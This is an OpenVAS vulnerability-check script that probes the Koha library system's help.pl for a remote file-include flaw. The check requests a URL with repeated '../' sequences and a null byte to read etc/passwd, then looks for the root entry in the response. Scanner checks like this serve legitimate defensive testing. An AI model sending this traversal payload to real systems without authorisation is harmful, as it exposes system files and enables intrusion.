###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_liblime_koha_51004.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Koha 'help.pl' Remote File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Koha is prone to a remote file-include vulnerability because it fails
to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information or execute arbitrary script code in the context
of the webserver process. This may allow the attacker to compromise
the application and the computer; other attacks are also possible.";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103361");
 script_bugtraq_id(51004);
 script_version ("$Revision: 9351 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("Koha 'help.pl' Remote File Include Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51004");
 script_xref(name : "URL" , value : "http://koha-community.org/");
 script_xref(name : "URL" , value : "http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=6628");

 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-12-12 10:49:53 +0100 (Mon, 12 Dec 2011)");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir, "/koha/help.pl?url=koha/",crap(data:"../",length:9*9),"etc/passwd%00.pl");

  if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
